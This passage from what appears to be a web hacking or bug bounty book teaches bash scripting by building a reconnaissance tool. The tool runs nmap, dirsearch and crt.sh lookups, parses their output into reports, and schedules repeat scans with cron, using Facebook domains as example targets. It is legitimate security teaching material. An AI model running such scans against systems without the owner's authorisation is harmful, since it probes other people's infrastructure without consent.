ends with esac, or case backward:\ncase $VARIABLE_NAME in\ncase1)\nDo something\n;;\ncase2)\nDo something\n;;\ncaseN)\nDo something\n;;\n*)\nDefault case, this case is executed if no other case matches.\n;;\nesac\nWe can improve our script by implementing the functionality with case\nstatements instead of multiple if-else statements:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\"\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\ncase $2 in\nnmap-only)\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n;;\ndirsearch-only)\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n;;\ncrt-only)\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt 1\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n;;\n*)\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n86 Chapter 5\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n;;\nesac\nThe curl command 1 downloads the content of a page. We use it here\nto download data from crt.sh. And curl’s -o option lets you specify an out-\nput file. But notice that our code has a lot of repetition! The sections of\ncode that run each type of scan repeat twice. Let’s try to reduce the repeti-\ntion by using functions. The syntax of a bash function looks like this:\nFUNCTION_NAME()\n{\nDO_SOMETHING\n}\nAfter you’ve declared a function, you can call it like any other shell\ncommand within the script. Let’s add functions to the script:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\"\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\nnmap_scan() 1\n{\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n}\ndirsearch_scan() 2\n{\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n}\ncrt_scan() 3\n{\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n}\ncase $2 in 4\nnmap-only)\nnmap_scan\n;;\ndirsearch-only)\ndirsearch_scan\n;;\ncrt-only)\ncrt_scan\n;;\n*)\nnmap_scan\nWeb Hacking Reconnaissance 87\ndirsearch_scan\ncrt_scan\n;;\nesac\nYou can see that we’ve simplified our code. We created three functions,\nnmap_scan 1, dirsearch_scan 2, and crt_scan 3. We put the scan and echo com-\nmands in these functions so we can call them repeatedly without writing\nthe same code over and over 4. This simplification might not seem like\nmuch here, but reusing code with functions will save you a lot of headaches\nwhen you write more complex programs.\nKeep in mind that all bash variables are global except for input param-\neters like $1, $2, and $3. This means that variables like $DOMAIN, $DIRECTORY,\nand $PATH_TO_DIRSEARCH become available throughout the script after we’ve\ndeclared them, even if they’re declared within functions. On the other\nhand, parameter values like $1, $2, and $3 can refer only to the values the\nfunction is called with, so you can’t use a script’s input arguments within\na function, like this:\nnmap_scan()\n{\nnmap $1 > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n}\nnmap_scan\nHere, the $1 in the function refers to the first argument that nmap_scan\nwas called with, not the argument our recon.sh script was called with. Since\nnmap_scan wasn’t called with any arguments, $1 is blank.\nParsing the Results\nNow we have a tool that performs three types of scans and stores the results\ninto files. But after the scans, we’d still have to manually read and make\nsense of complex output files. Is there a way to speed up this process too?\nLet’s say you want to search for a certain piece of information in the\noutput files. You can use Global Regular Expression Print (grep) to do that. This\ncommand line utility is used to perform searches in text, files, and command\noutputs. A simple grep command looks like this:\ngrep password file.txt\nThis tells grep to search for the string password in the file file.txt, then\nprint the matching lines in standard output. For example, we can quickly\nsearch the Nmap output file to see if the target has port 80 open:\n$ grep 80 TARGET_DIRECTORY/nmap\n80/tcp open http\nYou can also make your search more flexible by using regular expres-\nsions in your search string. A regular expression, or regex, is a special string\n88 Chapter 5\nthat describes a search pattern. It can help you display only specific parts of\nthe output. For example, you may have noticed that the output of the Nmap\ncommand looks like this:\nStarting Nmap 7.60 ( https://nmap.org )\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.065s latency).\nOther addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f\nNot shown: 992 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n80/tcp open http\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo\n31337/tcp open Elite\nNmap done: 1 IP address (1 host up) scanned in 2.43 seconds\nYou might want to trim the irrelevant messages from the file so it looks\nmore like this:\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n80/tcp open http\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo\n31337/tcp open Elite\nUse this command to filter out the messages at the start and end of\nNmap’s output and keep only the essential part of the report:\ngrep -E \"^\\S+\\s+\\S+\\s+\\S+$\" DIRECTORY/nmap > DIRECTORY/nmap_cleaned\nThe -E flag tells grep you’re using a regex. A regex consists of two parts:\nconstants and operators. Constants are sets of strings, while operators are sym-\nbols that denote operations over these strings. These two elements together\nmake regex a powerful tool of pattern matching. Here’s a quick overview of\nregex operators that represent characters:\n\\d matches any digit.\n\\w matches any character.\n\\s matches any whitespace, and \\S matches any non-whitespace.\n. matches with any single character.\n\\ escapes a special character.\n^ matches the start of the string or line.\n$ matches the end of the string or line.\nWeb Hacking Reconnaissance 89\nSeveral operators also specify the number of characters to match:\n* matches the preceding character zero or more times.\n+ matches the preceding character one or more times.\n{3} matches the preceding character three times.\n{1, 3} matches the preceding character one to three times.\n{1, } matches the preceding character one or more times.\n[abc] matches one of the characters within the brackets.\n[a-z] matches one of the characters within the range of a to z.\n(a|b|c) matches either a or b or c.\nLet’s take another look at our regex expression here. Remember how \\s\nmatches any whitespace, and \\S matches any non-whitespace? This means\n\\s+ would match any whitespace one or more characters long, and \\S+ would\nmatch any non-whitespace one or more characters long. This regex pattern\nspecifies that we should extract lines that contain three strings separated by\ntwo whitespaces:\n\"^\\S+\\s+\\S+\\s+\\S+$\"\nThe filtered output will look like this:\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n80/tcp open http\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n445/tcp filtered microsoft-ds\n9929/tcp open nping-echo\n31337/tcp open Elite\nTo account for extra whitespaces that might be in the command output,\nlet’s add two more optional spaces around our search string:\n\"^\\s*\\S+\\s+\\S+\\s+\\S+\\s*$\"\nYou can use many more advanced regex features to perform more\nsophisticated matching. However, this simple set of operators serves well for\nour purposes. For a complete guide to regex syntax, read RexEgg’s cheat\nsheet (https://www.rexegg.com/regex-quickstart.html).\nBuilding a Master Report\nWhat if you want to produce a master report from all three output files?\nYou need to parse the JSON file from crt.sh. You can do this with jq, a com-\nmand line utility that processes JSON. If we examine the JSON output file\nfrom crt.sh, we can see that we need to extract the name_value field of each\ncertificate item to extract domain names. This command does just that:\n$ jq -r \".[] | .name_value\" $DOMAIN/crt\n90 Chapter 5\nThe -r flag tells jq to write the output directly to standard output rather\nthan format it as JSON strings. The .[] iterates through the array within the\nJSON file, and .name_value extracts the name_value field of each item. Finally,\n$DOMAIN/crt is the input file to the jq command. To learn more about how jq\nworks, read its manual (https://stedolan.github.io/jq/manual/).\nTo combine all output files into a master report, write a script like this:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\nnmap_scan()\n{\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n}\ndirsearch_scan()\n{\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n}\ncrt_scan()\n{\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n}\ncase $2 in\nnmap-only)\nnmap_scan\n;;\ndirsearch-only)\ndirsearch_scan\n;;\ncrt-only)\ncrt_scan\n;;\n*)\nnmap_scan\ndirsearch_scan\ncrt_scan\n;;\nesac\necho \"Generating recon report from output files...\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\" > $DIRECTORY/report 1\necho \"Results for Nmap:\" >> $DIRECTORY/report\ngrep -E \"^\\s*\\S+\\s+\\S+\\s+\\S+\\s*$\" $DIRECTORY/nmap >> $DIRECTORY/report 2\necho \"Results for Dirsearch:\" >> $DIRECTORY/report\ncat $DIRECTORY/dirsearch >> $DIRECTORY/report 3\necho \"Results for crt.sh:\" >> $DIRECTORY/report\njq -r \".[] | .name_value\" $DIRECTORY/crt >> $DIRECTORY/report 4\nWeb Hacking Reconnaissance 91\nFirst, we create a new file named report and write today’s date into it 1\nto keep track of when the report was generated. We then append the results\nof the nmap and dirsearch commands into the report file 2. The cat com-\nmand prints the contents of a file to standard output, but we can also use\nit to redirect the content of the file into another file 3. Finally, we extract\ndomain names from the crt.sh report and append it to the end of the\nreport file 4.\nScanning Multiple Domains\nWhat if we want to scan multiple domains at once? When reconning a target,\nwe might start with several of the organization’s domain names. For example,\nwe know that Facebook owns both facebook.com and fbcdn.net. But our current\nscript allows us to scan only one domain at a time. We need to write a tool\nthat can scan multiple domains with a single command, like this:\n./recon.sh facebook.com fbcdn.net nmap-only\nWhen we scan multiple domains like this, we need a way to distinguish\nwhich arguments specify the scan MODE and which specify target domains.\nAs you’ve already seen from the tools I introduced, most tools allow users to\nmodify the behavior of a tool by using command line options or flags, such\nas -u and --simple-report.\nThe getopts tool parses options from the command line by using single-\ncharacter flags. Its syntax is as follows, where OPTSTRING specifies the option\nletters that getopts should recognize. For example, if it should recognize the\noptions -m and -i, you should specify mi. If you want an option to contain\nargument values, the letter should be followed by a colon, like this: m:i. The\nNAME argument specifies the variable name that stores the option letter.\ngetopts OPTSTRING NAME\nTo implement our multiple-domain scan functionality, we can let users\nuse an -m flag to specify the scan mode and assume that all other arguments\nare domains. Here, we tell getopts to recognize an option if the option flag\nis -m and that this option should contain an input value. The getopts tool\nalso automatically stores the value of any options into the $OPTARG variable.\nWe can store that value into a variable named MODE:\ngetopts \"m:\" OPTION\nMODE=$OPTARG\nNow if you run the shell script with an -m flag, the script will know that\nyou’re specifying a scan MODE! Note that getopts stops parsing arguments\nwhen it encounters an argument that doesn’t start with the - character, so\nyou’ll need to place the scan mode before the domain arguments when you\nrun the script:\n./recon.sh -m nmap-only facebook.com fbcdn.net\n92 Chapter 5\nNext, we’ll need a way to read every domain argument and perform\nscans on them. Let’s use loops! Bash has two types of loops: the for loop and\nthe while loop. The for loop works better for our purposes, as we already\nknow the number of values we are looping through. In general, you should\nuse for loops when you already have a list of values to iterate through. You\nshould use while loops when you’re not sure how many values to loop through\nbut want to specify the condition in which the execution should stop.\nHere’s the syntax of a for loop in bash. For every item in LIST_OF_VALUES,\nbash will execute the code between do and done once:\nfor i in LIST_OF_VALUES\ndo\nDO SOMETHING\ndone\nNow let’s implement our functionality by using a for loop:\n1 for i in \"${@:$OPTIND:$#}\"\ndo\n# Do the scans for $i\ndone\nWe create an array 1 that contains every command line argument,\nbesides the ones that are already parsed by getopts, which stores the index\nof the first argument after the options it parses into a variable named $OPTIND.\nThe characters $@ represent the array containing all input arguments, while\n$# is the number of command line arguments passed in. \"${@:OPTIND:}\" slices\nthe array so that it removes the MODE argument, like nmap-only, making sure\nthat we iterate through only the domains part of our input. Array slicing is\na way of extracting a subset of items from an array. In bash, you can slice\narrays by using this syntax (note that the quotes around the command are\nnecessary):\n\"${INPUT_ARRAY:START_INDEX:END_INDEX}\"\nThe $i variable represents the current item in the argument array. We\ncan then wrap the loop around the code:\n#!/bin/bash\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\nnmap_scan()\n{\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n}\ndirsearch_scan()\n{\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n}\ncrt_scan()\n{\nWeb Hacking Reconnaissance 93\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n}\ngetopts \"m:\" OPTION\nMODE=$OPTARG\nfor i in \"${@:$OPTIND:$#}\" 1\ndo\nDOMAIN=$i\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\ncase $MODE in\nnmap-only)\nnmap_scan\n;;\ndirsearch-only)\ndirsearch_scan\n;;\ncrt-only)\ncrt_scan\n;;\n*)\nnmap_scan\ndirsearch_scan\ncrt_scan\n;;\nesac\necho \"Generating recon report for $DOMAIN...\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\" > $DIRECTORY/report\nif [ -f $DIRECTORY/nmap ];then 2\necho \"Results for Nmap:\" >> $DIRECTORY/report\ngrep -E \"^\\s*\\S+\\s+\\S+\\s+\\S+\\s*$\" $DIRECTORY/nmap >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/dirsearch ];then 3\necho \"Results for Dirsearch:\" >> $DIRECTORY/report\ncat $DIRECTORY/dirsearch >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/crt ];then 4\necho \"Results for crt.sh:\" >> $DIRECTORY/report\njq -r \".[] | .name_value\" $DIRECTORY/crt >> $DIRECTORY/report\nfi\ndone 5\nThe for loop starts with the for keyword 1 and ends with the done key-\nword 5. Notice that we also added a few lines in the report section to see if\nwe need to generate each type of report. We check whether the output file\nof an Nmap scan, a Dirsearch scan, or a crt.sh scan exist so we can deter-\nmine if we need to generate a report for that scan type 2 3 4.\n94 Chapter 5\nThe brackets around a condition mean that we’re passing the con-\ntents into a test command: [ -f $DIRECTORY/nmap ] is equivalent to test -f\n$DIRECTORY/nmap.\nThe test command evaluates a conditional and outputs either true or\nfalse. The -f flag tests whether a file exists. But you can test for more condi-\ntions! Let’s go through some useful test conditions. The -eq and -ne flags test\nfor equality and inequality, respectively. This returns true if $3 is equal to 1:\nif [ $3 -eq 1 ]\nThis returns true if $3 is not equal to 1:\nif [ $3 -ne 1 ]\nThe -gt, -ge, -lt, and le flags test for greater than, greater than or equal\nto, less than, and less than or equal to, respectively:\nif [ $3 -gt 1 ]\nif [ $3 -ge 1 ]\nif [ $3 -lt 1 ]\nif [ $3 -le 1 ]\nThe -z and -n flags test whether a string is empty. These conditions are\nboth true:\nif [ -z \"\" ]\nif [ -n \"abc\" ]\nThe -d, -f, -r, -w, and -x flags check for directory and file statuses. You\ncan use them to check the existence and permissions of a file before your\nshell script operates on them. For instance, this command returns true if\n/bin is a directory that exists:\nif [ -d /bin]\nThis one returns true if /bin/bash is a file that exists:\nif [ -f /bin/bash ]\nAnd this one returns true if /bin/bash is a readable file:\nif [ -r /bin/bash ]\nor a writable file:\nif [ -w /bin/bash ]\nor an executable file:\nif [ -x /bin/bash ]\nWeb Hacking Reconnaissance 95\nYou can also use && and || to combine test expressions. This command\nreturns true if both expressions are true:\nif [ $3 -gt 1 ] && [ $3 -lt 3 ]\nAnd this one returns true if at least one of them is true:\nif [ $3 -gt 1 ] || [ $3 -lt 0 ]\nYou can find more comparison flags in the test command’s manual\nby running man test. (If you aren’t sure about the commands you’re using,\nyou can always enter man followed by the command name in the terminal to\naccess the command’s manual file.)\nWriting a Function Library\nAs your codebase gets larger, you should consider writing a function library\nto reuse code. We can store all the commonly used functions in a sepa-\nrate file called scan.lib. That way, we can call these functions as needed for\nfuture recon tasks:\n#!/bin/bash\nnmap_scan()\n{\nnmap $DOMAIN > $DIRECTORY/nmap\necho \"The results of nmap scan are stored in $DIRECTORY/nmap.\"\n}\ndirsearch_scan()\n{\n$PATH_TO_DIRSEARCH/dirsearch.py -u $DOMAIN -e php --simple-report=$DIRECTORY/dirsearch\necho \"The results of dirsearch scan are stored in $DIRECTORY/dirsearch.\"\n}\ncrt_scan()\n{\ncurl \"https://crt.sh/?q=$DOMAIN&output=json\" -o $DIRECTORY/crt\necho \"The results of cert parsing is stored in $DIRECTORY/crt.\"\n}\nIn another file, we can source the library file in order to use all of its\nfunctions and variables. We source a script via the source command, fol-\nlowed by the path to the script:\n#!/bin/bash\nsource ./scan.lib\nPATH_TO_DIRSEARCH=\"/Users/vickieli/tools/dirsearch\"\ngetopts \"m:\" OPTION\nMODE=$OPTARG\nfor i in \"${@:$OPTIND:$#}\"\ndo\nDOMAIN=$i\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\n96 Chapter 5\ncase $MODE in\nnmap-only)\nnmap_scan\n;;\ndirsearch-only)\ndirsearch_scan\n;;\ncrt-only)\ncrt_scan\n;;\n*)\nnmap_scan\ndirsearch_scan\ncrt_scan\n;;\nesac\necho \"Generating recon report for $DOMAIN...\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\" > $DIRECTORY/report\nif [ -f $DIRECTORY/nmap ];then\necho \"Results for Nmap:\" >> $DIRECTORY/report\ngrep -E \"^\\s*\\S+\\s+\\S+\\s+\\S+\\s*$\" $DIRECTORY/nmap >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/dirsearch ];then\necho \"Results for Dirsearch:\" >> $DIRECTORY/report\ncat $DIRECTORY/dirsearch >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/crt ];then\necho \"Results for crt.sh:\" >> $DIRECTORY/report\njq -r \".[] | .name_value\" $DIRECTORY/crt >> $DIRECTORY/report\nfi\ndone\nUsing a library can be super useful when you’re building multiple tools\nthat require the same functionalities. For example, you might build mul-\ntiple networking tools that all require DNS resolution. In this case, you can\nsimply write the functionality once and use it in all of your tools.\nBuilding Interactive Programs\nWhat if you want to build an interactive program that takes user input dur-\ning execution? Let’s say that if users enter the command line option, -i, you\nwant the program to enter an interactive mode that allows you to specify\ndomains to scan as you go:\n./recon.sh -i -m nmap-only\nFor that, you can use read. This command reads user input and stores\nthe input string into a variable:\necho \"Please enter a domain!\"\nread $DOMAIN\nWeb Hacking Reconnaissance 97\nThese commands will prompt the user to enter a domain, then store\nthe input inside a variable named $DOMAIN.\nTo prompt a user repeatedly, we need to use a while loop, which will\nkeep printing the prompt asking for an input domain until the user exits\nthe program. Here’s the syntax of a while loop. As long as the CONDITION is\ntrue, the while loop will execute the code between do and done repeatedly:\nwhile CONDITION\ndo\nDO SOMETHING\ndone\nWe can use a while loop to repeatedly prompt the user for domains\nuntil the user enters quit:\nwhile [ $INPUT != \"quit\" ];do\necho \"Please enter a domain!\"\nread INPUT\nif [ $INPUT != \"quit\" ];then\nscan_domain $INPUT\nreport_domain $INPUT\nfi\ndone\nWe also need a way for users to actually invoke the -i option, and our\ngetopts command isn’t currently doing that. We can use a while loop to\nparse options by using getopts repeatedly:\nwhile getopts \"m:i\" OPTION; do\ncase $OPTION in\nm)\nMODE=$OPTARG\n;;\ni)\nINTERACTIVE=true\n;;\nesac\ndone\nHere, we specify a while loop that gets command line options repeatedly.\nIf the option flag is -m, we set the MODE variable to the scan mode that the user\nhas specified. If the option flag is -i, we set the $INTERACTIVE variable to true.\nThen, later in the script, we can decide whether to invoke the interactive mode\nby checking the value of the $INTERACTIVE variable. Putting it all together, we\nget our final script:\n#!/bin/bash\nsource ./scan.lib\nwhile getopts \"m:i\" OPTION; do\ncase $OPTION in\nm)\nMODE=$OPTARG\n98 Chapter 5\n;;\ni)\nINTERACTIVE=true\n;;\nesac\ndone\nscan_domain(){\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Creating directory $DIRECTORY.\"\nmkdir $DIRECTORY\ncase $MODE in\nnmap-only)\nnmap_scan\n;;\ndirsearch-only)\ndirsearch_scan\n;;\ncrt-only)\ncrt_scan\n;;\n*)\nnmap_scan\ndirsearch_scan\ncrt_scan\n;;\nesac\n}\nreport_domain(){\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Generating recon report for $DOMAIN...\"\nTODAY=$(date)\necho \"This scan was created on $TODAY\" > $DIRECTORY/report\nif [ -f $DIRECTORY/nmap ];then\necho \"Results for Nmap:\" >> $DIRECTORY/report\ngrep -E \"^\\s*\\S+\\s+\\S+\\s+\\S+\\s*$\" $DIRECTORY/nmap >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/dirsearch ];then\necho \"Results for Dirsearch:\" >> $DIRECTORY/report\ncat $DIRECTORY/dirsearch >> $DIRECTORY/report\nfi\nif [ -f $DIRECTORY/crt ];then\necho \"Results for crt.sh:\" >> $DIRECTORY/report\njq -r \".[] | .name_value\" $DIRECTORY/crt >> $DIRECTORY/report\nfi\n}\nif [ $INTERACTIVE ];then 1\nINPUT=\"BLANK\"\nwhile [ $INPUT != \"quit\" ];do 2\necho \"Please enter a domain!\"\nread INPUT\nif [ $INPUT != \"quit\" ];then 3\nscan_domain $INPUT\nWeb Hacking Reconnaissance 99\nreport_domain $INPUT\nfi\ndone\nelse\nfor i in \"${@:$OPTIND:$#}\";do\nscan_domain $i\nreport_domain $i\ndone\nfi\nIn this program, we first check if the user has selected the interactive\nmode by specifying the -i option 1. We then repeatedly prompt the user\nfor a domain by using a while loop 2. If the user input is not the keyword\nquit, we assume that they entered a target domain, so we scan and produce\na report for that domain. The while loop will continue to run and ask the\nuser for domains until the user enters quit, which will cause the while loop\nto exit and the program to terminate 3.\nInteractive tools can help your workflow operate more smoothly. For\nexample, you can build testing tools that will let you choose how to proceed\nbased on preliminary results.\nUsing Special Variables and Characters\nYou’re now equipped with enough bash knowledge to build many versatile\ntools. This section offers more tips that concern the particularities of shell\nscripts.\nIn Unix, commands return 0 on success and a positive integer on fail-\nure. The variable $? contains the exit value of the last command executed.\nYou can use these to test for execution successes and failures:\n#!/bin/sh\nchmod 777 script.sh\nif [ \"$?\" -ne \"0\" ]; then\necho \"Chmod failed. You might not have permissions to do that!\"\nfi\nAnother special variable is $$, which contains the current process’s ID.\nThis is useful when you need to create temporary files for the script. If you\nhave multiple instances of the same script or program running at the same\ntime, each might need its own temporary files. In this case, you can create\ntemporary files named /tmp/script_name_$$ for every one of them.\nRemember that we talked about variable scopes in shell scripts earlier\nin this chapter? Variables that aren’t input parameters are global to the\nentire script. If you want other programs to use the variable as well, you\nneed to export the variable:\nexport VARIABLE_NAME=VARIABLE_VALUE\nLet’s say that in one of your scripts you set the variable VAR:\nVAR=\"hello!\"\n100 Chapter 5\nIf you don’t export it or source it in another script, the value gets\ndestroyed after the script exits. But if you export VAR in the first script and\nrun that script before running a second script, the second script will be able\nto read VAR’s value.\nYou should also be aware of special characters in bash. In Unix, the wild-\ncard character * stands for all. For example, this command will print out all\nthe filenames in the current directory that have the file extension .txt:\n$ ls *.txt\nBackticks (`) indicate command substitution. You can use both backticks\nand the $() command substitution syntax mentioned earlier for the same\npurpose. This echo command will print the output of the whoami command:\necho `whoami`\nMost special characters, like the wildcard character or the single quote,\naren’t interpreted as special when they are placed in double quotes. Instead,\nthey’re treated as part of a string. For example, this command will echo the\nstring \"abc '*' 123\":\n$ echo \"abc '*' 123\"\nAnother important special character is the backslash (\\), the escape\ncharacter in bash. It tells bash that a certain character should be inter-\npreted literally, and not as a special character.\nCertain special characters, like double quotes, dollar sign, backticks,\nand backslashes remain special even within double quotes, so if you want\nbash to treat them literally, you have to escape them by using a backslash:\n$ echo \"\\\" is a double quote. \\$ is a dollar sign. \\` is a backtick. \\\\ is a backslash.\"\nThis command will echo:\n\" is a double quote. $ is a dollar sign. ` is a backtick. \\ is a backslash.\nYou can also use a backslash before a newline to indicate that the line\nof code has not ended. For example, this command\nchmod 777 \\\nscript.sh\nis the same as this one:\nchmod 777 script.sh\nCongratulations! You can now write bash scripts. Bash scripting may\nseem scary at first, but once you’ve mastered it, it will be a powerful addition\nto your hacking arsenal. You’ll be able to perform better recon, conduct\nmore efficient testing, and have a more structured hacking workflow.\nWeb Hacking Reconnaissance 101\nIf you plan on implementing a lot of automation, it’s a good idea to\nstart organizing your scripts from the start. Set up a directory of scripts and\nsort your scripts by their functionality. This will become the start of devel-\noping your own hacking methodology. When you’ve collected a handful of\nscripts that you use on a regular basis, you can use scripts to run them auto-\nmatically. For example, you might categorize your scripts into recon scripts,\nfuzzing scripts, automated reporting, and so on. This way, every time you\nfind a script or tool you like, you can quickly incorporate it into your work-\nflow in an organized fashion.\nScheduling Automatic Scans\nNow let’s take your automation to the next level by building an alert system\nthat will let us know if something interesting turns up in our scans. This\nsaves us from having to run the commands manually and comb through the\nresults over and over again.\nWe can use cron jobs to schedule our scans. Cron is a job scheduler on\nUnix-based operating systems. It allows you to schedule jobs to run periodi-\ncally. For example, you can run a script that checks for new endpoints on\na particular site every day at the same time. Or you can run a scanner that\nchecks for vulnerabilities on the same target every day. This way, you can\nmonitor for changes in an application’s behavior and find ways to exploit it.\nYou can configure Cron’s behavior by editing files called crontabs. Unix\nkeeps different copies of crontabs for each user. Edit your own user’s crontab\nby running the following:\ncrontab -e\nAll crontabs follow this same syntax:\nA B C D E command_to_be_executed\nA: Minute (0 – 59)\nB: Hour (0 – 23)\nC: Day (1 – 31)\nD: Month (1 – 12)\nE: Weekday (0 – 7) (Sunday is 0 or 7, Monday is 1...)\nEach line specifies a command to be run and the time at which it should\nrun, using five numbers. The first number, from 0 to 59, specifies the minute\nwhen the command should run. The second number specifies the hour, and\nranges from 0 to 23. The third and fourth numbers are the day and month\nthe command should run. And the last number is the weekday when the\ncommand should run, which ranges from 0 to 7. Both 0 and 7 mean that\nthe command should run on Sundays; 1 means the command should run\non Mondays; and so on.\nFor example, you can add this line to your crontab to run your recon\nscript every day at 9:30 PM:\n30 21 * * * ./scan.sh\n102 Chapter 5\nYou can also batch-run the scripts within directories. The run-parts\ncommand in crontabs tells Cron to run all the scripts stored in a directory.\nFor example, you can store all your recon tools in a directory and scan your\ntargets periodically. The following line tells Cron to run all scripts in my\nsecurity directory every day at 9:30 PM:\n30 21 * * * run-parts /Users/vickie/scripts/security\nNext, git diff is a command that outputs the difference between two\nfiles. You need to install the Git program to use it. You can use git diff to\ncompare scan results at different times, which quickly lets you see if the tar-\nget has changed since you last scanned it:\ngit diff SCAN_1 SCAN_2\nThis will help you identify any new domains, subdomains, endpoints,\nand other new assets of a target. You could write a script like this to notify\nyou of new changes on a target every day:\n#!/bin/bash\nDOMAIN=$1\nDIRECTORY=${DOMAIN}_recon\necho \"Checking for new changes about the target: $DOMAIN.\\n Found these new things.\"\ngit diff <SCAN AT TIME 1> <SCAN AT TIME 2>\nAnd schedule it with Cron:\n30 21 * * * ./scan_diff.sh facebook.com\nThese automation techniques have helped me quickly find new JavaScript\nfiles, endpoints, and functionalities on targets. I especially like to use this tech-\nnique to discover subdomain takeover vulnerabilities automatically. We’ll talk\nabout subdomain takeovers in Chapter 20.\nAlternatively, you can use GitHub to track changes. Set up a repository\nto store your scan results at https://github.com/new/. GitHub has a Notification\nfeature that will tell you when significant events on a repository occur. It’s\nlocated at SettingsNotifications on each repository’s page. Provide GitHub\nwith an email address that it will use to notify you about changes. Then, in\nthe directory where you store scan results, run these commands to initiate\ngit inside the directory:\ngit init\ngit remote add origin https://PATH_TO_THE_REPOSITORY\nLastly, use Cron to scan the target and upload the files to GitHub\nperiodically:\n30 21 * * * ./recon.sh facebook.com\n40 21 * * * git add *; git commit -m \"new scan\"; git push -u origin master\nGitHub will then send you an email about the files that changed during\nthe new scan.\nWeb Hacking Reconnaissance 103\nA Note on Recon APIs\nMany of the tools mentioned in this chapter have APIs that allow you to\nintegrate their services into your applications and scripts. We’ll talk about\nAPIs more in Chapter 24, but for now, you can think of APIs as endpoints\nyou can use to query a service’s database. Using these APIs, you can query\nrecon tools from your script and add the results to your recon report with-\nout visiting their sites manually.\nFor example, Shodan has an API (https://developer.shodan.io/) that allows\nyou to query its database. You can access a host’s scan results by accessing\nthis URL: https://api.shodan.io/shodan/host/{ip}?key={YOUR_API_KEY}. You\ncould configure your bash script to send requests to this URL and parse the\nresults. LinkedIn also has an API (https://www.linkedin.com/developers/) that\nlets you query its database. For example, you can use this URL to access\ninformation about a user on LinkedIn: https://api.linkedin.com/v2/people/\n{PERSON ID}. The Censys API (https://censys.io/api) allows you to access\ncertificates by querying the endpoint https://censys.io/api/v1.\nOther tools mentioned in this chapter, like BuiltWith, Google search,\nand GitHub search, all have their own API services. These APIs can help\nyou discover assets and content more efficiently by integrating third-party\ntools into your recon script. Note that most API services require you to\ncreate an account on their website to obtain an API key, which is how most\nAPI services authenticate their users. You can find information about\nhow to obtain the API keys of popular recon services at 